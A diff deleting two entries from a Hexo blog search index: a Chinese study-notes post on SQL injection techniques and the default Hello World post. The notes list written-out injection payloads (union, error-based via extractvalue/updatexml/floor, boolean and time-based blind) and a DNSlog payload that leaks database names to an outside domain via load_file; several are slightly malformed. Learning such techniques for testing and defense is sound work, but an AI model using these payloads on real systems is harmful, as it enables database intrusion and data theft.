@@ -16,31 +16,5 @@
   
   
   
-  <entry>
-    <title>关于sql注入的一些理解</title>
-    <link href="/2023/04/12/article-title/"/>
-    <url>/2023/04/12/article-title/</url>
-    
-    <content type="html"><![CDATA[<p>union注入 union select通过group by&#x2F;order by判断列数 –+</p><p>创造回显点 id&#x3D;-1</p><p>判断是字符型还是数字型注入 2-1判断</p><p>拿到表名和列名</p><p>database() </p><p>information_schema系统自带的数据库，其中有tables和columns</p><p>通常有waf</p><p>union select 1,group_concat(table_name),3 from information_schema.tables where information_schemas&#x3D;  –+</p><p>group_concat将所有查询信息放到一行使用</p><p>数字型不用闭合</p><p>查询语句会优先查询括号里面的内容</p><p>?id&#x3D;0 union select 1,group_concat(column_name),2 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ –+</p><p>extractvalue  用来查询一个数据</p><p>0x7e是~ 提供错误 concat拼接参数</p><p>?id&#x3D;1’ and select 1,2,extractvalue(1,concat(0x7e,select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())) –+</p><p>报错注入有长度限制只有32字符 substring</p><p>substring(123456,2,3)   234 进行拼接</p><p>updatexml()三个参数 我们重点研究第二个参数 故意将第二个参数写错</p><p>id&#x3D;1’ and 1&#x3D;updatexml(1,concat(‘~’,select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database()),3)–+</p><p>floor报错</p><p>rand() 在0-1之间随机生成一个数</p><p>rand()*2在0-2之间随机生成一个数</p><p>floor()小数向下取整</p><p>select floor(rand()*2);在0和1之间随机生成</p><p>concat_ws(1,2,3)将后两个参数用第一个参数连接</p><p>select concat_ws(‘-‘,select database(),floor(rand()*2)) from users有多少用户就会重复多少次</p><p>select count(**),concat_ws(‘-‘,(select database()),floor(rand()*2))as a from users group by a在统计错误时报错</p><p>rand(0)稳定报错 rand(1)稳定不报错</p><p>?id&#x3D;1’ union select 1,count(*),concat_ws(‘-‘,select version(),floor(rand(0)*****2)) as x from information_schema.tables group by x–+</p><p>limit x,1控制输出</p><p>盲注分类：页面没有回显</p><p>布尔盲注 页面回复真假</p><p>ascii()函数 把字符变成一个对应的数字</p><p>select ascii(‘B’)</p><p>and ascii(substr(select database(),1,1))&gt;&#x3D;101–+比较字符来破解</p><p>and ascii(substr(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100 –+</p><p>substr(select columns_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’,1,1)</p><p>时间盲注:会执行代码但是不回显 sleep(3)使页面过几秒响应</p><p>点击网络耗时 可以看到响应时间</p><p>if(condition,true,false)</p><p>id&#x3D;1’ and if(ascii(substr(select database(),1,1))&gt;100,sleep(0),sleep(3))–+</p><p>dnslog注入</p><p>load_file()读取路径文件 利用dns解析服务记录日志 让目标网站去解析我的域名并且同时执行一个sql命令</p><p>利用一个dns解析网站</p><p>concat(“&#x2F;&#x2F;“,select database(),”.xxx.dnslog.cn&#x2F;benben”)</p><p>1’ and (select load_file(concat(“&#x2F;&#x2F;“,(select database()),”.xxx,dnslog.cn&#x2F;&#x2F;随意加一个文件名”)))–+</p><p>此时这个文件读取不出来 只能尝试访问这个域名，然后就可以在dnslog上看到数据库名</p><p>select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1来替换想要爆的信息</p><p>Post注入 get提交可以被缓存 且有最长字符限制</p><p>post提交没有长度要求，且还可以使用二进制数据</p>]]></content>
-    
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>Hello World</title>
-    <link href="/2023/02/26/hello-world/"/>
-    <url>/2023/02/26/hello-world/</url>
-    
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
-    
-    
-    
-  </entry>
-  
-  
-  
   
 </search>
